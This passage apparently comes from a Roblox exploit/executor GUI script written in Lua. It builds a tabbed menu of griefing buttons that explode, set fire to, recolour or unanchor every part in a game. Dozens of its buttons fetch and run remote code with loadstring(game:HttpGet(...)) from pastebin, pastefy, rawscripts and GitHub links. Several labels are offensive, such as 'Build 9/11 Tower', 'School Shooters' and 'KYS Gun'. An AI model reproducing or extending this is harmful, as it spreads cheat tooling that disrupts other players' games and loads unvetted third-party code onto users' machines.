nextpage.Text = ">"
nextpage.BackgroundTransparency = 0 
nextpage.TextColor3 = Color3.new(255, 255, 255)
nextpage.Font = Enum.Font.Arial
nextpage.Parent = SPage6
nextpage.TextSize = 15
nextpage.MouseButton1Click:Connect(function()
	SPage6.Visible = false
	SPage7.Visible = true
end)
ApplyRainbowBorder(nextpage)

local PageCount = Instance.new("TextLabel")
PageCount.Size = UDim2.new(0, 40, 0, 15)
PageCount.Position = UDim2.new(0.74, 0, 0.922, 0)
PageCount.BackgroundColor3 = Color3.new(1, 1, 1)
PageCount.BorderColor3 = Color3.new(0, 0, 0)
PageCount.BorderSizePixel = 1
PageCount.Text = "Page 6 of "..TotalPage
PageCount.BackgroundTransparency = 1 
PageCount.TextColor3 = Color3.new(255, 255, 255)
PageCount.Font = Enum.Font.Arial
PageCount.Parent = SPage6
PageCount.TextSize = 15

local beforepage = Instance.new("TextButton")
beforepage.Size = UDim2.new(0, 40, 0, 15)
beforepage.Position = UDim2.new(0.58, 0, 0.922, 0)
beforepage.BackgroundColor3 = Color3.new(0, 0, 0)
beforepage.BorderColor3 = Color3.new(1, 1, 1)
beforepage.BorderSizePixel = 2
beforepage.Text = "<"
beforepage.BackgroundTransparency = 0 
beforepage.TextColor3 = Color3.new(255, 255, 255)
beforepage.Font = Enum.Font.Arial
beforepage.Parent = SPage6
beforepage.TextSize = 15
beforepage.MouseButton1Click:Connect(function()
	SPage5.Visible = true
	SPage6.Visible = false
end)
ApplyRainbowBorder(beforepage)

local nextpage = Instance.new("TextButton")
nextpage.Size = UDim2.new(0, 34, 0, 15)
nextpage.Position = UDim2.new(0.9, 0, 0.922, 0)
nextpage.BackgroundColor3 = Color3.new(0, 0, 0)
nextpage.BorderColor3 = Color3.new(1, 1, 1)
nextpage.BorderSizePixel = 2
nextpage.Text = ">"
nextpage.BackgroundTransparency = 0 
nextpage.TextColor3 = Color3.new(255, 255, 255)
nextpage.Font = Enum.Font.Arial
nextpage.Parent = SPage4
nextpage.TextSize = 15
nextpage.MouseButton1Click:Connect(function()
	SPage4.Visible = false
	SPage5.Visible = true
end)
ApplyRainbowBorder(nextpage)

local nextpage = Instance.new("TextButton")
nextpage.Size = UDim2.new(0, 34, 0, 15)
nextpage.Position = UDim2.new(0.9, 0, 0.922, 0)
nextpage.BackgroundColor3 = Color3.new(0, 0, 0)
nextpage.BorderColor3 = Color3.new(1, 1, 1)
nextpage.BorderSizePixel = 2
nextpage.Text = ">"
nextpage.BackgroundTransparency = 0 
nextpage.TextColor3 = Color3.new(255, 255, 255)
nextpage.Font = Enum.Font.Arial
nextpage.Parent = SPage7
nextpage.TextSize = 15
nextpage.MouseButton1Click:Connect(function()
end)
ApplyRainbowBorder(nextpage)

local PageCount = Instance.new("TextLabel")
PageCount.Size = UDim2.new(0, 40, 0, 15)
PageCount.Position = UDim2.new(0.74, 0, 0.922, 0)
PageCount.BackgroundColor3 = Color3.new(1, 1, 1)
PageCount.BorderColor3 = Color3.new(0, 0, 0)
PageCount.BorderSizePixel = 1
PageCount.Text = "Page 7 of "..TotalPage
PageCount.BackgroundTransparency = 1 
PageCount.TextColor3 = Color3.new(255, 255, 255)
PageCount.Font = Enum.Font.Arial
PageCount.Parent = SPage7
PageCount.TextSize = 15

local beforepage = Instance.new("TextButton")
beforepage.Size = UDim2.new(0, 40, 0, 15)
beforepage.Position = UDim2.new(0.58, 0, 0.922, 0)
beforepage.BackgroundColor3 = Color3.new(0, 0, 0)
beforepage.BorderColor3 = Color3.new(1, 1, 1)
beforepage.BorderSizePixel = 2
beforepage.Text = "<"
beforepage.BackgroundTransparency = 0 
beforepage.TextColor3 = Color3.new(255, 255, 255)
beforepage.Font = Enum.Font.Arial
beforepage.Parent = SPage7
beforepage.TextSize = 15
beforepage.MouseButton1Click:Connect(function()
	SPage6.Visible = true
	SPage7.Visible = false
end)
ApplyRainbowBorder(beforepage)

local Home = Instance.new("TextButton")
Home.Size = UDim2.new(0, 107, 0, 29)
Home.Position = UDim2.new(0, 0, 0, 0)
Home.BackgroundColor3 = Color3.new(0, 0, 0)
Home.BorderSizePixel = 2
Home.Text = "Home"
Home.Name = "Home"
Home.BackgroundTransparency = 0 
Home.TextColor3 = Color3.new(255, 255, 255)
Home.Font = Enum.Font.Arial
Home.Parent = Holder
Home.TextSize = 18
ApplyRainbowBorder(Home)
Home.MouseButton1Click:Connect(function()
HomeP.Visible = true
ExecutorP.Visible = false
ServerP.Visible = false
ScriptP.Visible = false
end)

local Server = Instance.new("TextButton")
Server.Size = UDim2.new(0, 103, 0, 29)
Server.Position = UDim2.new(0.234, 0, 0, 0)
Server.BackgroundColor3 = Color3.new(0, 0, 0)
Server.BorderSizePixel = 2
Server.Text = "Server/Local"
Server.BackgroundTransparency = 0 
Server.TextColor3 = Color3.new(255, 255, 255)
Server.Font = Enum.Font.Arial
Server.Parent = Holder
Server.TextSize = 18
Server.Name = "server"
ApplyRainbowBorder(Server)
Server.MouseButton1Click:Connect(function()
ServerP.Visible = true
HomeP.Visible = false
ScriptP.Visible = false
ExecutorP.Visible = false
end)

local Scripts = Instance.new("TextButton")
Scripts.Size = UDim2.new(0, 89, 0, 29)
Scripts.Position = UDim2.new(0.46, 0, 0, 0)
Scripts.BackgroundColor3 = Color3.new(0, 0, 0)
Scripts.BorderSizePixel = 2
Scripts.Text = "Script"
Scripts.BackgroundTransparency = 0 
Scripts.TextColor3 = Color3.new(255, 255, 255)
Scripts.Font = Enum.Font.Arial
Scripts.Parent = Holder
Scripts.TextSize = 18
Scripts.Name = "Scripts"
Scripts.MouseButton1Click:Connect(function()
	ServerP.Visible = false
	HomeP.Visible = false
	ScriptP.Visible = true
	ExecutorP.Visible = false
end)
ApplyRainbowBorder(Scripts)

local Executor = Instance.new("TextButton")
Executor.Size = UDim2.new(0, 79, 0, 29)
Executor.Position = UDim2.new(0.654, 0, 0, 0)
Executor.BackgroundColor3 = Color3.new(0, 0, 0)
Executor.BorderSizePixel = 2
Executor.Text = "Executor"
Executor.BackgroundTransparency = 0 
Executor.TextColor3 = Color3.new(255, 255, 255)
Executor.Font = Enum.Font.Arial
Executor.Parent = Holder
Executor.TextSize = 18
Executor.Name = "Executor"
Executor.MouseButton1Click:Connect(function()
	ServerP.Visible = false
	HomeP.Visible = false
	ScriptP.Visible = false
	ExecutorP.Visible = true
end)
ApplyRainbowBorder(Executor)

local Output = Instance.new("TextButton")
Output.Size = UDim2.new(0, 79, 0, 29)
Output.Position = UDim2.new(0.827, 0, 0, 0)
Output.BackgroundColor3 = Color3.new(0, 0, 0)
Output.BorderSizePixel = 2
Output.Text = "Misc"
Output.BackgroundTransparency = 0 
Output.TextColor3 = Color3.new(255, 255, 255)
Output.Font = Enum.Font.Arial
Output.Parent = Holder
Output.TextSize = 18
Output.Name = "Miscelanisious"
ApplyRainbowBorder(Output)

local Profile = Instance.new("ImageLabel")
Profile.Size = UDim2.new(0, 100, 0, 100)
Profile.Position = UDim2.new(0.015, 0, 0.071, 0)
Profile.BackgroundColor3 = Color3.new(0, 0, 0)
Profile.ImageColor3 = Color3.new(1, 1, 1)
Profile.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
Profile.ImageTransparency = 0
Profile.Parent = HomeP
Profile.Name = "Profile"


Profile.BackgroundTransparency = 1
Instance.new("LocalScript", Profile)

local User = Instance.new("TextLabel")

User.Size = UDim2.new(0, 350, 0, 20)
User.Position = UDim2.new(0, 120, 0.071, 0)
User.BackgroundColor3 = Color3.new(1, 1, 1)
User.BorderColor3 = Color3.new(0, 0, 0)
User.BorderSizePixel = 1
User.Text = "Username : "..game.Players.LocalPlayer.Name
User.BackgroundTransparency = 1
User.TextColor3 = Color3.new(255, 255, 255)
User.Font = Enum.Font.Arial
User.Parent = HomeP
User.TextSize = 18
User.TextXAlignment = "Left"
User.Name = "user"

local Age = Instance.new("TextLabel")
Age.Size = UDim2.new(0, 350, 0, 20)
Age.Position = UDim2.new(0, 120, 0.154, 0)
Age.BackgroundColor3 = Color3.new(0, 0, 0)
Age.BorderColor3 = Color3.new(0, 0, 0)
Age.BorderSizePixel = 1
Age.Text = "Age Days : "..game.Players.LocalPlayer.AccountAge.." Days"
Age.BackgroundTransparency = 1
Age.TextColor3 = Color3.new(255, 255, 255)
Age.Font = Enum.Font.Arial
Age.Parent = HomeP
Age.Name = "uhm"
Age.TextSize = 18
Age.TextXAlignment = "Left"

local Fe = Instance.new("TextLabel")
Fe.Size = UDim2.new(0, 350, 0, 20)
Fe.Position = UDim2.new(0, 120, 0.249, 0)
Fe.BackgroundColor3 = Color3.new(0, 0, 0)
Fe.BorderColor3 = Color3.new(0, 0, 0)
Fe.BorderSizePixel = 1
Fe.Text = "RFE : Checking"
Fe.BackgroundTransparency = 1
Fe.TextColor3 = Color3.new(255, 255, 255)
Fe.Font = Enum.Font.Arial
Fe.Parent = HomeP
Fe.Name = "idk"
Fe.TextXAlignment = "Left"
Fe.TextSize = 18
local function Checkk()
	wait(1)
	local script = Instance.new("LocalScript", Fe)
	
	if game:GetService("SoundService").RespectFilteringEnabled == true then
		Fe.Text = "RFE : Enabled!"
	else
		Fe.Text = "RFE : Disabled!"
	end
end
coroutine.wrap(Checkk)()

local Load = Instance.new("TextLabel")
Load.Size = UDim2.new(0, 350, 0, 20)
Load.Position = UDim2.new(0, 120, 0.345, 0)
Load.BackgroundColor3 = Color3.new(0, 0, 0)
Load.BorderColor3 = Color3.new(0, 0, 0)
Load.BorderSizePixel = 1
Load.Text = "Loading"
Load.BackgroundTransparency = 1
Load.TextColor3 = Color3.new(255, 255, 255)
Load.Font = Enum.Font.Arial
Load.Parent = HomeP
Load.TextSize = 18
Load.Name = "PercentLoaded"
Load.TextXAlignment = "Left"
local function LOADING()
	local script = Instance.new("LocalScript", Load)
	
	wait(1)
	
	local Percent = 0
	
	for i = 1, 100 do
		Load.Text = "Loading ("..Percent.."%)"
		Percent += 1
		wait()
	end
	Load.Text = "Successfully Whitelisted User "..game.Players.LocalPlayer.UserId
	local Logo = Instance.new("ScreenGui", Ob)
	Logo.Name = "Logo"
	Logo.ResetOnSpawn = false
	local Ring = Instance.new("ImageLabel")
Ring.Size = UDim2.new(0, 110, 0, 110)
Ring.Position = UDim2.new(1, 0, 0.35, 0)
Ring.BackgroundColor3 = Color3.new(0, 0, 0)
Ring.ImageColor3 = Color3.new(1, 1, 1)
Ring.Image = "rbxassetid://72903195461776"
Ring.ImageTransparency = 0
Ring.Parent = Logo


Ring.BackgroundTransparency = 1 

local Orbit = Instance.new("ImageLabel")
Orbit.Size = UDim2.new(0, 110, 0, 110)
Orbit.Position = UDim2.new(0, 0, 0, 0)
Orbit.BackgroundColor3 = Color3.new(0, 0, 0)
Orbit.ImageColor3 = Color3.new(1, 1, 1)
Orbit.Image = "rbxassetid://126506133083228"
Orbit.ImageTransparency = 0
Orbit.Parent = Ring


Orbit.BackgroundTransparency = 1 
local function COROTINE()
	local script = Instance.new("LocalScript", Orbit)
	
	while task.wait() do
		script.Parent.Rotation += 1
	end
end
coroutine.wrap(COROTINE)()

local Planet = Instance.new("ImageLabel")
Planet.Size = UDim2.new(0, 35, 0, 35)
Planet.Position = UDim2.new(0, 5, 0, 0)
Planet.BackgroundColor3 = Color3.new(0, 0, 0)
Planet.ImageColor3 = Color3.new(1, 1, 1)
Planet.Image = "rbxassetid://102692053574412"
Planet.ImageTransparency = 0
Planet.Parent = Orbit


Planet.BackgroundTransparency = 1 
local function COROTINE()
	local script = Instance.new("LocalScript", Planet)
	
	while task.wait() do
		script.Parent.Rotation -= 1
	end
end
coroutine.wrap(COROTINE)()

local function COROTINE()
	local script = Instance.new("LocalScript", Ring)
	
	local Ts = game:GetService("TweenService")
	local Ti = TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut, 0, false, 0)
	
	local Tween = Ts:Create(script.Parent, Ti, {Position = UDim2.new(0.45, 0, 0.35, 0)})
	Tween:Play()
	wait(4)
	local Tween = Ts:Create(script.Parent, Ti, {Position = UDim2.new(0.851, 0, 0.857, 0)})
	Tween:Play()
end
coroutine.wrap(COROTINE)()


local Spin = Instance.new("Frame")
Spin.Size = UDim2.new(1, 0, 1, 0)
Spin.Position = UDim2.new(0, 0, 0, 0)
Spin.BackgroundColor3 = Color3.new(1, 1, 1)
Spin.BorderColor3 = Color3.new(0, 0, 0)
Spin.BorderSizePixel = 1
Spin.BackgroundTransparency = 1 
Spin.Parent = Ring

local Info = Instance.new("TextLabel")
Info.Size = UDim2.new(0, 220, 1, 0)
Info.Position = UDim2.new(1, 5, 0, 0)
Info.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
Info.BorderColor3 = Color3.new(0, 0, 0)
Info.BorderSizePixel = 4
Info.Text = "Made by LIONARC_HELON Inspired by Alif Polaria Style, Script by me and Credit script by Other\nStatus : Injected"
Info.BackgroundTransparency = 1 
Info.TextColor3 = Color3.new(255, 255, 255)
Info.Font = Enum.Font.Gotham
Info.TextScaled = true
Info.Parent = Spin
Info.Rotation = -180
Info.TextTransparency = 1
Spin.MouseEnter:Connect(function()
local Ts = game:GetService("TweenService")
local Ti = TweenInfo.new(2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, 0, false, 0)
local Tween = Ts:Create(Spin, Ti, {Rotation = -180})
Tween:Play()
local Tween = Ts:Create(Info, Ti, {BackgroundTransparency = 0})
Tween:Play()
local Tween = Ts:Create(Info, Ti, {Rotation = 180})
Tween:Play()
local Tween = Ts:Create(Info, Ti, {TextTransparency = 0})
Tween:Play()
end)
Spin.MouseLeave:Connect(function()
local Ts = game:GetService("TweenService")
local Ti = TweenInfo.new(2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, 0, false, 0)
local Tween = Ts:Create(Spin, Ti, {Rotation = 0})
Tween:Play()
local Tween = Ts:Create(Info, Ti, {BackgroundTransparency = 1})
Tween:Play()
local Tween = Ts:Create(Info, Ti, {Rotation = -180})
Tween:Play()
local Tween = Ts:Create(Info, Ti, {TextTransparency = 1})
Tween:Play()
end)
end
coroutine.wrap(LOADING)()

local LocalTime = Instance.new("TextLabel")
LocalTime.Size = UDim2.new(0, 350, 0, 20)
LocalTime.Position = UDim2.new(0, 5, 0.45, 0)
LocalTime.BackgroundColor3 = Color3.new(0, 0, 0)
LocalTime.BorderColor3 = Color3.new(0, 0, 0)
LocalTime.BorderSizePixel = 1
LocalTime.Text = "Local Time : [ ??:??:?? ]"
LocalTime.BackgroundTransparency = 0 
LocalTime.TextColor3 = Color3.new(255, 255, 255)
LocalTime.Font = Enum.Font.Arial
LocalTime.Parent = HomeP
LocalTime.Name = "LocalTime"
LocalTime.TextXAlignment = "Left"
LocalTime.TextSize = 18
local function TimeDate()
	local script = Instance.new("LocalScript", LocalTime)
	
	wait(1)
	local textLabel = script.Parent  -- Reference to the TextLabel  
	local function updateTime()
		while true do
			local timeString = os.date("%I:%M:%S %p")
			-- 12-hour format with AM/PM 	
			textLabel.Text = "Local Time : [ " .. timeString  .. " ]"
			task.wait(1)  -- Update every second 	
		end 
	end  
	task.spawn(updateTime)  -- Start the clock 
end
coroutine.wrap(TimeDate)()

local FPS = Instance.new("TextLabel")
FPS.Size = UDim2.new(0, 350, 0, 20)
FPS.Position = UDim2.new(0, 5, 0.52, 0)
FPS.BackgroundColor3 = Color3.new(0, 0, 0)
FPS.BorderColor3 = Color3.new(0, 0, 0)
FPS.BorderSizePixel = 1
FPS.Text = "FPS : Counting..."
FPS.BackgroundTransparency = 0 
FPS.TextColor3 = Color3.new(255, 255, 255)
FPS.Font = Enum.Font.Arial
FPS.Parent = HomeP
FPS.Name = "FPS"
FPS.TextXAlignment = "Left"
FPS.TextSize = 18
local function COROTINE()
	local script = Instance.new("LocalScript", FPS)
	
	wait(1)
	game["Run Service"].RenderStepped:Connect(function(D)
		FPS.Text = "FPS : " .. D
		task.wait()
	end)
end
coroutine.wrap(COROTINE)()

local JobId = Instance.new("TextLabel")
JobId.Size = UDim2.new(0, 350, 0, 20)
JobId.Position = UDim2.new(0, 5, 0.59, 0)
JobId.BackgroundColor3 = Color3.new(0, 0, 0)
JobId.BorderColor3 = Color3.new(0, 0, 0)
JobId.BorderSizePixel = 1
JobId.Text = "JobId : "..game.JobId
JobId.BackgroundTransparency = 0 
JobId.TextColor3 = Color3.new(255, 255, 255)
JobId.Font = Enum.Font.Arial
JobId.Parent = HomeP
JobId.Name = "JobId"
JobId.TextXAlignment = "Left"
JobId.TextSize = 18

local gameLocalization = Instance.new("TextLabel")
gameLocalization.Size = UDim2.new(0, 350, 0, 20)
gameLocalization.Position = UDim2.new(0, 5, 0.66, 0)
gameLocalization.BackgroundColor3 = Color3.new(0, 0, 0)
gameLocalization.BorderColor3 = Color3.new(0, 0, 0)
gameLocalization.BorderSizePixel = 1
gameLocalization.Text = "Place Id : Verifying (Searching Game)"
gameLocalization.BackgroundTransparency = 0 
gameLocalization.TextColor3 = Color3.new(255, 255, 255)
gameLocalization.Font = Enum.Font.Arial
gameLocalization.Parent = HomeP
gameLocalization.Name = "gameLocalization"
gameLocalization.TextXAlignment = "Left"
gameLocalization.TextSize = 18
local function COROTINE()
	local script = Instance.new("LocalScript", gameLocalization)
	
	local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
	script.Parent.Text = "Place Id : " .. game.GameId .. " ("..GetName.Name..")"
end
coroutine.wrap(COROTINE)()


--For Add Button
AddButton(ServerP, "UnAnchor", X1Y1, function() 
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Part") then
			v.Anchored = false
		end
	end
end)

AddButton(ServerP, "FE R6", X2Y1, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sunday102711-bit/E00KIDD-r6-by-me/refs/heads/main/R6%20Real"))()
end)

AddButton(ServerP, "Disco", X3Y1, function()
	local function LOOL()
		local script = Instance.new("LocalScript", nil)
		
		while task.wait() do
			for i, v in pairs(workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.Color = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
				end
			end
		end
	end
	coroutine.wrap(LOOL)()
end)

AddButton(ServerP, "Colorfull Fog", X4Y1, function()
	local function FOCK()
		local script = Instance.new("LocalScript", nil)
		
		while true do
			wait()
			game.Lighting.Ambient = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
		end
	end
	coroutine.wrap(FOCK)()
end)
AddButton(ServerP, "RainPart", X1Y2, function()
for i = 1, math.random(1, 230) do
local Plr = game.Players.LocalPlayer
local Char = Plr.Character

local Part = Instance.new("Part", workspace)
Part.Size = Vector3.new(math.random(1, 60), math.random(1, 60), math.random(1, 60))
Part.Material = "Neon"
Part.Shape = "Ball"
Part.Position = Char.HumanoidRootPart.Position + Vector3.new(math.random(1, 50), 350, math.random(1, 50))
task.wait()
local Exp = Instance.new("Explosion", Part)
Exp.Position = Part.Position
Part.Color = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
local Smoke = Instance.new("Smoke", Part)
Smoke.Color = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
Smoke.Size = math.random(1, 100)
task.wait()
end
end)
AddButton(ServerP, "Build 9/11 Tower (CFrame)", X2Y2, function()
local Part = Instance.new("Part", workspace)
Part.Size = Vector3.new(100, 1000, 100)
Part.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(100, 0, -300)
Part.Material = "Marble"
Part.Color = Color3.new(1, 1, 1)
Part.Anchored = true

local Part2 = Instance.new("Part", workspace)
Part2.Size = Vector3.new(100, 1000, 100)
Part2.CFrame = Part.CFrame * CFrame.new(-300, 0, 0)
Part2.Material = "Marble"
Part2.Color = Color3.new(1, 1, 1)
Part2.Anchored = true
end)
AddButton(ServerP, "Massive Explode", X3Y2, function()
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Part") then
			local S = Instance.new("Explosion", v)
			S.Position = v.Position
			S.Hit:Connect(function(Parts)
				Parts.Color = Color3.new(0, 0, 0)
				local Fire = Instance.new("Fire", Parts)
				Fire.Size = math.random(1, 35)
				Parts.Anchored = false
			end)
		end
	end
end)
AddButton(ServerP, "Smoke W**d", X4Y2)
AddButton(ServerP, "Illuminated", X1Y3)
AddButton(ServerP, "Firework", X2Y3)
AddButton(ServerP, "Massive Fire", X3Y3)
AddButton(ServerP, "Blue Fire", X4Y3, function()
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Part") then
			local Fire = Instance.new("Fire", v)
			Fire.Color = Color3.fromRGB(0, 100, 255)
			Fire.Size = 35
		end
	end
end)
AddButton(ServerP, "Nuke", X1Y4)
AddButton(ServerP, "Shutdown", X2Y4, function()
	game.Players.LocalPlayer:Kick("\n\n The Server has Been Shutdown")
end)
AddButton(ServerP, "Fling All", X3Y4)
AddButton(ServerP, "Anti-Robloxian", X4Y4, function()
game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):Destroy()
end)
AddButton(ServerP, "Anti-Kick", X1Y5)
AddButton(ServerP, "Decal + Skybox + Particle", X2Y5, function()
local Image = "rbxassetid://79482625549535"

for i, v in pairs(workspace:GetDescendants()) do
	if v:IsA("BasePart") then
		local Decal1 = Instance.new("Decal", v)
		Decal1.Texture = Image
		Decal1.Face = "Top"
		local Decal2 = Instance.new("Decal", v)
		Decal2.Texture = Image
		Decal2.Face = "Bottom"
		local Decal3 = Instance.new("Decal", v)
		Decal3.Texture = Image
		Decal3.Face = "Front"
		local Decal4 = Instance.new("Decal", v)
		Decal4.Texture = Image
		Decal4.Face = "Back"
		local Decal5 = Instance.new("Decal", v)
		Decal5.Texture = Image
		Decal5.Face = "Left"
		local Decal6 = Instance.new("Decal", v)
		Decal6.Texture = Image
		Decal6.Face = "Right"
	end
end

for i = 1, math.random(1, 3) do
	print(i)
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			local Particle = Instance.new("ParticleEmitter")
			Particle.Parent = v
			Particle.Texture = Image
		end
	end
end

local Skybox = Instance.new("Sky", game.Lighting)
Skybox.SkyboxBk = Image
Skybox.SkyboxDn = Image
Skybox.SkyboxFt = Image
Skybox.SkyboxLf = Image
Skybox.SkyboxRt = Image
Skybox.SkyboxUp = Image

local Hint = Instance.new("Hint", workspace)
Hint.Text = "TEAM DEBUGGER ON TOP | Youtube : @LIONARC_HELON"


end)
AddButton(ServerP, "Flood", X3Y5)
AddButton(ServerP, "Black Smoke (May Closed you Screen)", X4Y5, function()
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Part") then
			local smoke = Instance.new("Smoke", v)
			smoke.Color = Color3.new(0, 0, 0)
			smoke.Size = 25
		end
	end
end)
AddButton(ServerP, "TR0J4NTR0UBL3R.exe", X1Y6)
AddButton(ServerP, "Lain", X2Y6)
AddButton(ServerP, "Delete LocalPlayer", X2Y6, function()
	for i, v in pairs(game.Players:GetChildren()) do
		if not v.Name == game.Players.LocalPlayer then
			v:Destroy()
		end
	end
end)
AddButton(ServerP, "[MASSIVE] Brutal Destruction", X3Y6, function()
	local function RECALL()
		local script = Instance.new("LocalScript", nil)
		
		while true do
			task.wait()
			for i, v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					v.Rotation = Vector3.new(math.random(1, 360), math.random(1, 360), math.random(1, 360))
					v.Color = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
					v.Position = Vector3.new(math.random(1, 300), math.random(1, 300), math.random(1, 300))
					game.Lighting.Ambient = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
					local Exp = Instance.new("Explosion", v)
					Exp.Position = v.Position
				end
			end
		end
	end
	coroutine.wrap(RECALL)()
end)
AddButton(ServerP, "Invisible All", X4Y6)
AddButton(ServerP, "Lay Down All", X1Y7)
AddButton(ServerP, "Brutal Rotation", X2Y7, function()
	local Ts = game:GetService("TweenService")
	local Ti = TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut, 0, false, 0)
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Part") then
			local Tween = Ts:Create(v, Ti, {Rotation = Vector3.new(math.random(1, 360), math.random(1, 360), math.random(1, 360))})
			Tween:Play()
		end
	end
end)
AddButton(ServerP, "Disable FilteringEnabled", X3Y7)
AddButton(ServerP, "FE ForceField", X4Y7, function()
	Instance.new("ForceField", game.Players.LocalPlayer.Character)
end)

--Script Section

AddButton(SPage1, "Starlight SS", X1Y1, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-starlight-archive-46524"))()
end)
AddButton(SPage1, "Galactic Titan", X2Y1, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TEST19983/Reslasjd/refs/heads/main/attac"))()
end)
AddButton(SPage1, "Railgun Titan Absolob", X3Y1, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TEST19983/Assigment/refs/heads/main/Assignment"))()
end)
AddButton(SPage1, "Nebula Star Glicther", X4Y1, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nebula-Star-Glitcher-46143"))()
end)
AddButton(SPage1, "Good Cops Bad Cops", X1Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/good-cop-bad-coop/refs/heads/main/KwuminKa.txt"))()
end)
AddButton(SPage1, "Spectrum Star Glicther", X2Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/SCPECTRUMGLITCHER/refs/heads/main/SpectrumG%20(1).txt"))()
end)
AddButton(SPage1, "Xester V1", X3Y2, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-Xester-18937"))()
end)
AddButton(SPage1, "Project LIONARCH_HELON", X4Y2, function()

end)
AddButton(SPage1, "The Angle", X1Y3, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/the-angel/refs/heads/main/The%20Angel.txt"))()
end)
AddButton(SPage1, "AK-47", X2Y3, function()

end)
AddButton(SPage1, "M4A1-S", X3Y3, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Idk-script-6-30278"))()
end)
AddButton(SPage1, "Private gui by Hanif", X4Y3)
AddButton(SPage1, "SG Gui Red Edition", X1Y4)
AddButton(SPage1, "MLG Gun", X2Y4)
AddButton(SPage1, "Private gui by QnDx aka Polpy_Kid", X3Y4)
AddButton(SPage1, "Grandosla", X4Y4, function()
loadstring(game:HttpGet("https://pastefy.app/Kql9VClT/raw"))()
end)
AddButton(SPage1, "Grab knife V3", X1Y5, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-grab-knife-v3-9232"))()
end)
AddButton(SPage1, "Private gui by LionArchelon", X2Y5)
AddButton(SPage1, "Tragicaly Underpowered Sugma", X3Y5)
AddButton(SPage1, "School Shooters", X4Y5, function()
loadstring(game:HttpGet("https://web.archive.org/web/20230402143414/https://pastebin.com/raw/3usrPSdi"))()
end)
AddButton(SPage1, "KYS Gun", X1Y6, function()
loadstring(game:HttpGet("https://pastebin.com/raw/F6qy56R6"))()
end)
AddButton(SPage1, "Hanger", X2Y6, function()
loadstring(game:HttpGet("https://pastebin.com/raw/jXTbqHHL"))()
end)
AddButton(SPage1, "youareanidiot.org", X3Y6, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-You-are-a-idiot-Jumpscare-28005"))()
end)
AddButton(SPage1, "DreamBull Gui", X4Y6, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Bypass-idk-32121"))()
end)
AddButton(SPage1, "Rc7 (SS)", X1Y7, function()
loadstring(game:HttpGet("https://pastebin.com/raw/2GCB3P3t"))()
end)
AddButton(SPage1, "PS Admin V1.0.0", X2Y7)
AddButton(SPage1, "Ro-Xploit 5.0", X3Y7, function()
loadstring(game:GetObjects("rbxassetid://288646117")[1].Source)()
end)
AddButton(SPage1, "Secret Service Panel (ORIGINAL)", X4Y7, function()
loadstring(game:HttpGet("https://pastefy.app/t2gUwfXy/raw"))()
end)

AddButton(SPage2, "ExSer", X1Y1, function()
loadstring(game:HttpGet("https://pastefy.app/7sO8ckTL/raw",true))()
end)
AddButton(SPage2, "HappyHub SS", X2Y1)
AddButton(SPage2, "Time Blast", X3Y1, function()
loadstring(game:HttpGet("https://pastebin.com/raw/GTakvdnB"))()
end)
AddButton(SPage2, "SG Gui Blue Editon", X4Y1)
AddButton(SPage2, "Mr bean Admin (By LIONARCH_HELON)", X1Y2, function()
wait(math.random(1, 4))
       local Prefix = ""

local gui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
gui.ResetOnSpawn = false
gui.Name = "mr bean admin update"

local Cmds = Instance.new("Frame")
Cmds.Size = UDim2.new(0.5, 0, 0.5, 0)
Cmds.Position = UDim2.new(0.3, 0, 0.3, 0)
Cmds.BackgroundColor3 = Color3.new(0, 0, 0)
Cmds.BorderColor3 = Color3.new(1, 1, 1)
Cmds.BorderSizePixel = 3
Cmds.Active = true
Cmds.BackgroundTransparency = 0.5
Cmds.Draggable = true
Cmds.Parent = gui

local Lulsz = Instance.new("TextLabel")
Lulsz.Size = UDim2.new(1, 0, 0.1, 3)
Lulsz.Position = UDim2.new(0, 0, 0, 0)
Lulsz.BackgroundColor3 = Color3.new(0, 0, 0)
Lulsz.BorderColor3 = Color3.new(0, 0, 0)
Lulsz.BorderSizePixel = 1
Lulsz.Text = "Command"
Lulsz.BackgroundTransparency = 1 
Lulsz.TextColor3 = Color3.new(255, 255, 255)
Lulsz.Font = Enum.Font.Arial
Lulsz.Parent = Cmds
Lulsz.TextSize = 27

local ScrollingFrame = Instance.new("ScrollingFrame")
